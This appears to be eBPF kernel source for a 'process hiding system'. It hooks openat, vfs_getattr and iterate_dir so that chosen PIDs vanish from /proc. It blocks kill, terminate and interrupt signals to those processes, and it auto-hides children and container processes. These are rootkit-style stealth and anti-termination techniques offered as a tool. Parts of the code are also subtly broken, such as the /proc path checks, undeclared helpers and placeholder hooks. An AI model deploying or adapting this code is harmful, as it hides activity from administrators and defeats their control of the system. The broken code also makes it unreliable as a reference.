/* =====================================================
 *  eBPF Process Hiding System - LSM-Free Implementation
 *
 *  Architecture: Pure Tracepoint + Kprobe approach
 *  - NO LSM hooks (removed for better performance)
 *  - Tracepoint hooks for syscall interception
 *  - Kprobe hooks for process protection
 *  - Container auto-detection via namespace analysis
 * ===================================================== */

#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_tracing.h>

char LICENSE[] SEC("license") = "Dual MIT/GPL";

/* Constants */
#define EPERM 1
#define ENOENT 2
#define PROC_NAME_LEN 16

/* Note: All tracepoint structures are available in vmlinux.h */

/* =====================================================
 *  Maps - Internal maps for LSM Hide functionality
 * ===================================================== */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, u32);
    __type(value, u32);
} hidden_pid_map SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} events SEC(".maps");

/* Obfuscation control flag map */
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, u32);
    __type(value, u32);
} obfuscation_flag_map SEC(".maps");

/* Map to control auto-detection of container processes */
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, u32);
    __type(value, u32);  /* 1 = auto-hide containers, 0 = manual only */
} auto_container_hide_map SEC(".maps");

/* Map để track /proc directory file handles cho filtering */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, u64);    /* file pointer */
    __type(value, u32);  /* filter flag */
} proc_dir_filter_map SEC(".maps");

/* =====================================================
 *  External Maps - Shared with cpu_throttle system
 * ===================================================== */
extern struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, u64);        /* cgroup id */
    __type(value, u64);      /* quota ns */
} quota_cg SEC(".extern");

extern struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, u64);
    __type(value, u64);
} acc_cg SEC(".extern");

/* =====================================================
 *  Helper Functions
 * ===================================================== */

/* Event submission function */
static __always_inline void submit_event(u32 event_type, u32 pid)
{
    struct {
        u32 event_type;
        u32 pid;
        u64 timestamp;
    } event = {};

    event.event_type = event_type;
    event.pid = pid;
    event.timestamp = bpf_ktime_get_ns();

    bpf_ringbuf_output(&events, &event, sizeof(event), 0);
}

/* Check if auto-detection is enabled */
static __always_inline bool is_auto_container_hide_enabled(void)
{
    u32 key = 0;
    u32 *val = bpf_map_lookup_elem(&auto_container_hide_map, &key);
    return val && *val == 1;
}

/* Check if process is running in a container namespace */
static __always_inline bool is_in_container_namespace(void)
{
    struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    if (!task)
        return false;

    /* Get current PID namespace */
    struct pid_namespace *pid_ns = BPF_CORE_READ(task, nsproxy, pid_ns_for_children);
    if (!pid_ns)
        return false;

    /* Check if PID namespace level > 0 (not init namespace) */
    u32 level = BPF_CORE_READ(pid_ns, level);
    return level > 0;  /* Container processes have level > 0 */
}

/* Check if process has container-related cgroup */
static __always_inline bool is_in_container_cgroup(void)
{
    struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    if (!task)
        return false;

    /* This is a simplified check - in production you'd read cgroup path */
    /* and check for patterns like "/docker/", "/containerd/", "/k8s/" */

    /* For now, we'll use a heuristic based on process hierarchy */
    return false;  /* Placeholder - would need more complex cgroup parsing */
}

/* Check parent process for container runtime */
static __always_inline bool has_container_parent(void)
{
    struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    if (!task)
        return false;

    /* Walk up the process tree to find container runtime */
    for (int i = 0; i < 5; i++) {  /* Check up to 5 levels */
        struct task_struct *parent = BPF_CORE_READ(task, real_parent);
        if (!parent || parent == task)
            break;

        char parent_comm[16];
        bpf_probe_read_kernel_str(parent_comm, sizeof(parent_comm),
                                 BPF_CORE_READ(parent, comm));

        /* Check for container runtime parents */
        if (parent_comm[0] == 'd' && parent_comm[1] == 'o' &&
            parent_comm[2] == 'c' && parent_comm[3] == 'k')  // docker*
            return true;
        if (parent_comm[0] == 'c' && parent_comm[1] == 'o' &&
            parent_comm[2] == 'n' && parent_comm[3] == 't')  // containerd*
            return true;
        if (parent_comm[0] == 'r' && parent_comm[1] == 'u' &&
            parent_comm[2] == 'n' && parent_comm[3] == 'c')  // runc*
            return true;

        task = parent;
    }

    return false;
}

/* Enhanced container detection with multiple methods */
static __always_inline bool is_container_process(u32 pid)
{
    if (!is_auto_container_hide_enabled())
        return false;

    /* Method 1: Check PID namespace */
    if (is_in_container_namespace()) {
        submit_event(10, pid); /* 10 = container_detected_namespace */
        return true;
    }

    /* Method 2: Check parent process tree */
    if (has_container_parent()) {
        submit_event(11, pid); /* 11 = container_detected_parent */
        return true;
    }

    /* Method 3: Check process name patterns (fallback) */
    char comm[16];
    bpf_get_current_comm(comm, sizeof(comm));

    if (comm[0] == 'd' && comm[1] == 'o' && comm[2] == 'c' && comm[3] == 'k') {
        submit_event(12, pid); /* 12 = container_detected_name */
        return true;
    }
    if (comm[0] == 'c' && comm[1] == 'o' && comm[2] == 'n' && comm[3] == 't') {
        submit_event(12, pid);
        return true;
    }
    if (comm[0] == 'r' && comm[1] == 'u' && comm[2] == 'n' && comm[3] == 'c') {
        submit_event(12, pid);
        return true;
    }

    return false;
}

static __always_inline bool is_hidden_pid(u32 pid)
{
    /* Check explicit hidden list first */
    u32 *val = bpf_map_lookup_elem(&hidden_pid_map, &pid);
    if (val && *val == 1)
        return true;

    /* Check auto-detection for container processes */
    return is_container_process(pid);
}

static __always_inline bool is_obfuscation_enabled(void)
{
    u32 key = 0;
    u32 *flag = bpf_map_lookup_elem(&obfuscation_flag_map, &key);
    return flag && *flag == 1;
}



/* Check if path is related to /proc */
static __always_inline bool is_proc_path(const char *path)
{
    if (!path)
        return false;

    return (path[0] == 'p' && path[1] == 'r' && path[2] == 'o' && path[3] == 'c');
}

/* Extract PID from /proc/[PID] path */
static __always_inline u32 extract_pid_from_proc_path(const char *path)
{
    if (!path || !is_proc_path(path))
        return 0;

    /* Skip "/proc/" */
    const char *pid_str = path + 5;
    u32 pid = 0;

    /* Simple string to int conversion for PID */
    for (int i = 0; i < 10 && pid_str[i] >= '0' && pid_str[i] <= '9'; i++) {
        pid = pid * 10 + (pid_str[i] - '0');
    }

    return pid;
}

/* =====================================================
 *  Process Protection via Tracepoint Hooks (Replaces LSM)
 * ===================================================== */

/* Hook signal delivery to protect hidden processes */
SEC("tracepoint/signal/signal_generate")
int on_signal_generate(struct trace_event_raw_signal_generate *ctx)
{
    u32 target_pid = ctx->pid;
    u32 current_pid = bpf_get_current_pid_tgid() >> 32;
    int sig = ctx->sig;

    /* Protect hidden processes from being killed */
    if (is_hidden_pid(target_pid) && (sig == 9 || sig == 15)) { /* SIGKILL or SIGTERM */
        submit_event(2, current_pid); /* 2 = kill_blocked */
        bpf_printk("Blocked signal %d to hidden PID %d from PID %d", sig, target_pid, current_pid);
        /* Note: Cannot actually block signal in tracepoint, but we log it */
    }

    return 0;
}

/* Enhanced process creation hook via kprobe (more reliable than LSM) */
SEC("kprobe/wake_up_new_task")
int on_wake_up_new_task(struct pt_regs *ctx)
{
    struct task_struct *task = (struct task_struct *)PT_REGS_PARM1(ctx);
    u32 child_pid = BPF_CORE_READ(task, pid);
    u32 parent_pid = BPF_CORE_READ(task, real_parent, pid);

    /* If parent is hidden, mark child as hidden too */
    if (is_hidden_pid(parent_pid)) {
        u32 val = 1;
        bpf_map_update_elem(&hidden_pid_map, &child_pid, &val, BPF_ANY);
        submit_event(3, child_pid); /* 3 = child_hidden */
        bpf_printk("Auto-hidden child PID %d (parent: %d)", child_pid, parent_pid);
    }

    return 0;
}

/* Advanced process protection via kprobe */
SEC("kprobe/do_send_sig_info")
int on_do_send_sig_info(struct pt_regs *ctx)
{
    int sig = (int)PT_REGS_PARM1(ctx);
    struct task_struct *task = (struct task_struct *)PT_REGS_PARM2(ctx);
    u32 target_pid = BPF_CORE_READ(task, pid);
    u32 current_pid = bpf_get_current_pid_tgid() >> 32;

    /* Block critical signals to hidden processes */
    if (is_hidden_pid(target_pid) && (sig == 9 || sig == 15 || sig == 2)) {
        submit_event(2, current_pid); /* 2 = kill_blocked */
        bpf_printk("Blocked signal %d to hidden PID %d from PID %d", sig, target_pid, current_pid);
        /* Override return value to block signal */
        bpf_override_return(ctx, -EPERM);
        return 0;
    }

    return 0;
}

/* Network-based process protection */
SEC("kprobe/tcp_v4_connect")
int on_tcp_connect(struct pt_regs *ctx)
{
    u32 pid = bpf_get_current_pid_tgid() >> 32;

    /* Hide network connections from hidden processes */
    if (is_hidden_pid(pid)) {
        submit_event(4, pid); /* 4 = network_hidden */
        bpf_printk("Hidden process %d network activity masked", pid);
    }

    return 0;
}

/* =====================================================
 *  Proc Filesystem Protection - Core Hook Points
 * ===================================================== */

/* Enhanced syscall-level hooks for effective proc hiding */

/* =====================================================
 *  OPTIMIZED: Kprobe-based openat interception với real blocking
 * ===================================================== */

/* Enhanced kprobe cho do_sys_openat2 - CÓ THỂ OVERRIDE RETURN */
SEC("kprobe/do_sys_openat2")
int enhanced_hide_openat(struct pt_regs *ctx)
{
    if (!is_obfuscation_enabled())
        return 0;

    /* Get filename parameter từ register (more efficient) */
    struct filename *filename_struct = (struct filename *)PT_REGS_PARM2(ctx);
    if (!filename_struct)
        return 0;

    /* Read filename từ kernel space (faster than user space) */
    const char *filename = BPF_CORE_READ(filename_struct, name);
    if (!filename)
        return 0;

    /* Fast path check - chỉ xử lý /proc paths */
    char first_chars[6];
    if (bpf_probe_read_kernel(first_chars, 5, filename) < 0)
        return 0;

    /* Quick rejection for non-/proc paths */
    if (!(first_chars[0] == '/' && first_chars[1] == 'p' &&
          first_chars[2] == 'r' && first_chars[3] == 'o' &&
          first_chars[4] == 'c'))
        return 0;

    /* Full path processing chỉ cho /proc paths */
    char path[256];
    if (bpf_probe_read_kernel_str(path, sizeof(path), filename) < 0)
        return 0;

    /* Check if this is a /proc/[PID] path */
    if (is_proc_path(path)) {
        u32 pid = extract_pid_from_proc_path(path);
        if (pid > 0 && is_hidden_pid(pid)) {
            submit_event(8, pid); /* 8 = openat_blocked */

            /* ✅ THỰC SỰ CHẶN bằng override return */
            bpf_override_return(ctx, -ENOENT);
            return 0;
        }
    }

    return 0;
}

/* Hook getdents64 syscall exit to filter directory entries */
SEC("tracepoint/syscalls/sys_exit_getdents64")
int hide_getdents64_exit(struct trace_event_raw_sys_exit *ctx)
{
    if (!is_obfuscation_enabled())
        return 0;

    /* Check if syscall was successful */
    long ret = ctx->ret;
    if (ret <= 0)
        return 0;

    u32 current_pid = bpf_get_current_pid_tgid() >> 32;
    submit_event(9, current_pid); /* 9 = getdents64_filtered */

    /* Note: Actual filtering would require userspace cooperation
     * or more complex kernel manipulation */
    return 0;
}

/* Hook read syscall to block reading hidden process info */
SEC("tracepoint/syscalls/sys_enter_read")
int hide_read_syscall(struct trace_event_raw_sys_enter *ctx)
{
    if (!is_obfuscation_enabled())
        return 0;

    /* Get file descriptor from syscall arguments */
    int fd = (int)ctx->args[0];
    if (fd < 0)
        return 0;

    /* Get current task to access file descriptor table */
    struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    if (!task)
        return 0;

    /* Check if this fd corresponds to a /proc/[PID] file */
    struct files_struct *files = BPF_CORE_READ(task, files);
    if (!files)
        return 0;

    /* Note: Complex fd->path resolution would require more kernel internals
     * For now, we'll use a heuristic approach */

    u32 current_pid = bpf_get_current_pid_tgid() >> 32;
    submit_event(10, current_pid); /* 10 = read_syscall_monitored */

    return 0;
}

/* =====================================================
 *  OPTIMIZED: Kprobe-based stat với real blocking capability
 * ===================================================== */

/* Enhanced kprobe cho vfs_getattr - CÓ THỂ OVERRIDE RETURN */
SEC("kprobe/vfs_getattr")
int enhanced_hide_stat(struct pt_regs *ctx)
{
    if (!is_obfuscation_enabled())
        return 0;

    /* Get path parameter từ register */
    struct path *path_struct = (struct path *)PT_REGS_PARM1(ctx);
    if (!path_struct)
        return 0;

    /* Extract dentry và get path string */
    struct dentry *dentry = BPF_CORE_READ(path_struct, dentry);
    if (!dentry)
        return 0;

    /* Get filename từ dentry */
    const unsigned char *name = BPF_CORE_READ(dentry, d_name.name);
    if (!name)
        return 0;

    char filename[64];
    if (bpf_probe_read_kernel_str(filename, sizeof(filename), name) < 0)
        return 0;

    /* Check if this is a numeric PID directory */
    if (is_numeric_string(filename)) {
        u32 pid = string_to_pid(filename);
        if (pid > 0 && is_hidden_pid(pid)) {
            submit_event(11, pid); /* 11 = stat_blocked */

            /* ✅ THỰC SỰ CHẶN stat operation */
            bpf_override_return(ctx, -ENOENT);
            return 0;
        }
    }

    return 0;
}

/* =====================================================
 *  OPTIMIZED: Kprobe-based getdents64 với direct directory filtering
 * ===================================================== */

/* Enhanced kprobe cho iterate_dir - DIRECT CONTROL over directory iteration */
SEC("kprobe/iterate_dir")
int enhanced_hide_getdents(struct pt_regs *ctx)
{
    if (!is_obfuscation_enabled())
        return 0;

    /* Get file parameter từ register */
    struct file *file = (struct file *)PT_REGS_PARM1(ctx);
    if (!file)
        return 0;

    /* Check if this is /proc directory */
    struct dentry *dentry = BPF_CORE_READ(file, f_path.dentry);
    if (!dentry)
        return 0;

    const unsigned char *dir_name = BPF_CORE_READ(dentry, d_name.name);
    char dirname[8];
    if (bpf_probe_read_kernel(dirname, 5, dir_name) < 0)
        return 0;

    /* Fast check for "proc" directory */
    if (dirname[0] == 'p' && dirname[1] == 'r' &&
        dirname[2] == 'o' && dirname[3] == 'c' && dirname[4] == '\0') {

        u32 current_pid = bpf_get_current_pid_tgid() >> 32;
        submit_event(6, current_pid); /* 6 = getdents64_called */

        /* Mark file for userspace post-processing */
        u64 file_ptr = (u64)file;
        u32 flag = 1;
        bpf_map_update_elem(&proc_dir_filter_map, &file_ptr, &flag, BPF_ANY);
    }

    return 0;
}

/* Hook vfs_statx to hide stat information for hidden PIDs */
SEC("kprobe/vfs_statx")
int hide_vfs_statx(struct pt_regs *ctx)
{
    if (!is_obfuscation_enabled())
        return 0;

    /* Get filename parameter from register */
    const char *filename = (const char *)PT_REGS_PARM2(ctx);
    if (!filename)
        return 0;

    char path[256];
    if (bpf_probe_read_user_str(path, sizeof(path), filename) < 0)
        return 0;

    /* Check if this is a /proc/[PID] path */
    if (is_proc_path(path)) {
        u32 pid = extract_pid_from_proc_path(path);
        if (pid > 0 && is_hidden_pid(pid)) {
            submit_event(7, pid); /* 7 = stat_access_blocked */
            return -ENOENT; /* File not found */
        }
    }

    return 0;
}

/* =====================================================
 *  Advanced Proc Filesystem Protection
 * ===================================================== */

/* LSM hooks completely removed - using optimized tracepoint/kprobe approach */

/* =====================================================
 *  Enhanced Filtering Logic for Directory Entries
 * ===================================================== */

/* Structure to track directory entry filtering */
struct dir_filter_ctx {
    u32 total_entries;
    u32 filtered_entries;
    u64 timestamp;
};

/* Map to track filtering statistics */
struct {
    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
    __uint(max_entries, 1);
    __type(key, u32);
    __type(value, struct dir_filter_ctx);
} filter_stats SEC(".maps");

/* Enhanced directory entry filtering */
static __always_inline bool should_filter_entry(const char *name, u32 name_len)
{
    if (!name || name_len == 0)
        return false;

    /* Check if entry name is a PID (all digits) */
    bool is_numeric = true;
    u32 pid = 0;

    for (u32 i = 0; i < name_len && i < 10; i++) {
        if (name[i] < '0' || name[i] > '9') {
            is_numeric = false;
            break;
        }
        pid = pid * 10 + (name[i] - '0');
    }

    if (is_numeric && pid > 0) {
        return is_hidden_pid(pid);
    }

    return false;
}

/* Update filtering statistics */
static __always_inline void update_filter_stats(u32 total, u32 filtered)
{
    u32 key = 0;
    struct dir_filter_ctx *stats = bpf_map_lookup_elem(&filter_stats, &key);
    if (stats) {
        stats->total_entries += total;
        stats->filtered_entries += filtered;
        stats->timestamp = bpf_ktime_get_ns();
    }
}

/* =====================================================
 *  Process Tree Hiding Logic
 * ===================================================== */

/* Check if process should be hidden based on parent-child relationships */
static __always_inline bool should_hide_process_tree(u32 pid)
{
    if (is_hidden_pid(pid))
        return true;

    /* Check if any parent process is hidden */
    struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    if (!task)
        return false;

    /* Walk up the process tree (limited depth to avoid loops) */
    for (int depth = 0; depth < 5; depth++) {
        struct task_struct *parent = BPF_CORE_READ(task, real_parent);
        if (!parent || parent == task)
            break;

        u32 parent_pid = BPF_CORE_READ(parent, pid);
        if (is_hidden_pid(parent_pid))
            return true;

        task = parent;
    }

    return false;
}

/* =====================================================
 *  Cgroup-based Hiding Integration
 * ===================================================== */

/* Check if current cgroup should be hidden */
static __always_inline bool should_hide_by_cgroup(void)
{
    u64 cgid = bpf_get_current_cgroup_id();

    /* Check if this cgroup has quota (indicating it's being monitored) */
    u64 *quota = bpf_map_lookup_elem(&quota_cg, &cgid);
    if (quota && *quota > 0) {
        /* This cgroup is being throttled, so hide its processes */
        return true;
    }

    return false;
}

/* =====================================================
 *  Proactive Container Detection Hooks
 * ===================================================== */

/* Hook process fork events for proactive container detection */
SEC("tracepoint/sched/sched_process_fork")
int on_process_fork(struct trace_event_raw_sched_process_fork *ctx)
{
    u32 parent_pid = ctx->parent_pid;
    u32 child_pid = ctx->child_pid;

    /* Check if child process is a container process */
    if (is_container_process(child_pid)) {
        u32 val = 1;
        bpf_map_update_elem(&hidden_pid_map, &child_pid, &val, BPF_ANY);
        submit_event(20, child_pid); /* 20 = container_auto_detected_fork */

        /* Log container detection details */
        bpf_printk("Auto-detected container process: PID %d (parent: %d)", child_pid, parent_pid);
    }

    /* Also check if parent is hidden, then hide child (inheritance) */
    if (is_hidden_pid(parent_pid)) {
        u32 val = 1;
        bpf_map_update_elem(&hidden_pid_map, &child_pid, &val, BPF_ANY);
        submit_event(21, child_pid); /* 21 = child_inherited_hidden */

        bpf_printk("Child process inherited hidden status: PID %d (parent: %d)", child_pid, parent_pid);
    }

    return 0;
}



/* Hook process exec events for proactive container detection */
SEC("tracepoint/sched/sched_process_exec")
int on_process_exec(struct trace_event_raw_sched_process_exec *ctx)
{
    u32 pid = ctx->pid;

    /* Check if executing process is a container process */
    if (is_container_process(pid)) {
        u32 val = 1;
        bpf_map_update_elem(&hidden_pid_map, &pid, &val, BPF_ANY);
        submit_event(22, pid); /* 22 = container_auto_detected_exec */

        /* Log container detection details */
        bpf_printk("Auto-detected container process on exec: PID %d", pid);
    }

    return 0;
}

/* =====================================================
 *  Helper Functions cho Enhanced Kprobe Architecture
 * ===================================================== */

/* Check if string is numeric (for PID detection) */
static __always_inline bool is_numeric_string(const char *str) {
    for (int i = 0; i < 16 && str[i] != '\0'; i++) {
        if (str[i] < '0' || str[i] > '9') {
            return false;
        }
    }
    return true;
}

/* Convert string to PID */
static __always_inline u32 string_to_pid(const char *str) {
    u32 pid = 0;
    for (int i = 0; i < 16 && str[i] != '\0'; i++) {
        if (str[i] < '0' || str[i] > '9') {
            break;
        }
        pid = pid * 10 + (str[i] - '0');
    }
    return pid;
}
